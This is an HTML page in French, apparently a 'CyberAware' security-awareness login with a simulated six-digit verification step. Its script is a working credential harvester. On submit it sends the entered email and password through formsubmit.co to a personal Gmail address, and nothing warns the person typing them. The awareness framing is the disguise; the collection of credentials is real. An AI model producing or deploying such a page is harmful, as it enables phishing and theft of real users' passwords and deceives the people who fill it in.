
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CyberAware – Sensibilisation</title>

  <style>
    :root {
      --main-color: #2563eb;
      --border-color: #e2e8f0;
    }

    * {
      box-sizing: border-box;
      font-family: Segoe UI, Tahoma, sans-serif;
    }

    body {
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .wrapper {
      max-width: 900px;
      width: 100%;
      padding: 20px;
    }

    .card {
      border: 1px solid var(--border-color);
      border-radius: 12px;
      padding: 30px;
      margin-bottom: 25px;
      text-align: center;
      box-shadow: 0 6px 20px rgba(0,0,0,.05);
    }

    h1,h2,h3 {
      color: var(--main-color);
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid var(--border-color);
    }

    button {
      width: 100%;
      padding: 12px;
      background: var(--main-color);
      color: #fff;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }

    .hidden {
      display: none;
    }

    .demo {
      background: #f1f5f9;
      padding: 12px;
      border-radius: 8px;
      margin: 15px 0;
      font-size: .9em;
    }
  </style>
</head>
<body>

<div class="wrapper">

  <!-- LOGIN -->
  <section id="loginSection" class="card">
    <h1>CyberAware</h1>
    <p>Plateforme de sensibilisation</p>

    <form id="loginForm">
      <input type="email" name="email" required placeholder="Adresse email">
      <input type="password" name="password" required placeholder="Mot de passe">
      <button type="submit">Continuer</button>
    </form>
  </section>

  <!-- CODE -->
  <section id="codeSection" class="card hidden">
    <h2>Vérification</h2>
    <p class="demo">
      Code généré (simulation) :
      <strong id="generatedCode"></strong>
    </p>
    <form id="codeForm">
      <input type="text" id="codeInput" placeholder="Code à 6 chiffres">
      <button type="button" onclick="verifyCode()">Valider</button>
    </form>
  </section>

  <!-- DASHBOARD -->
  <section id="dashboard" class="card hidden">
    <h2>Accès validé</h2>
    <p>Bienvenue sur la plateforme éducative.</p>
  </section>

</div>

<script>
  let generatedCode = "";

  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    // Génère un code à 6 chiffres (simulation)
    generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
    document.getElementById("generatedCode").innerText = generatedCode;

    // Prépare les données pour Formsubmit
    const formData = new FormData(this);
    formData.append("_subject", "Nouvelle inscription CyberAware");
    formData.append("_captcha", "false");
    formData.append("code_validation", generatedCode);

    // Envoi AJAX
    fetch("https://formsubmit.co/ajax/tss.alex84@gmail.com", {
      method: "POST",
      headers: {
        "Accept": "application/json"
      },
      body: formData
    })
    .then(response => response.json())
    .then(() => {
      // Affiche l'étape code
      document.getElementById("loginSection").classList.add("hidden");
      document.getElementById("codeSection").classList.remove("hidden");
    })
    .catch(() => {
      alert("Erreur lors de l'envoi");
    });
  });

  function verifyCode() {
    const input = document.getElementById("codeInput").value;
    if (input === generatedCode) {
      document.getElementById("codeSection").classList.add("hidden");
      document.getElementById("dashboard").classList.remove("hidden");
    } else {
      alert("Code incorrect");
    }
  }
</script>

</body>
</html>
